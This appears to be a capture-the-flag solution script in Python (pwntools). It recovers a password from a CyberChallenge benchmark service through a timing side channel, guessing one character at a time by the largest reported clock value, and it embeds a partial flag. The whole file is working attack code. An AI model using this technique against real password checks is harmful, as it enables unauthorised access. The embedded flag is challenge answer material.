from pwn import *
import re

HOST = 'benchmark.challs.cyberchallenge.it'
PORT = 9031
CHARSET = string.ascii_letters + string.digits + "{}_-!?"

r = remote(HOST, PORT)

pwd = "CCIT{s1d3_ch4nn3ls_r_c00l"
clocks = {}


for i in range(32):
    for chr in CHARSET:
        data = r.recvuntil(b'check:\n')
        # I can pad it with payload = (pwd + char).ljust(36, 'A')
        payload = pwd + chr

        r.sendline(payload.encode())
        data = r.recvline()

        clock = int(re.findall(rb'\d+', data)[0])
        clocks[chr] = clock

    pwd += max(clocks, key=clocks.get)
    clocks = {}

    print(f'Current password found: {pwd}')

r.close()



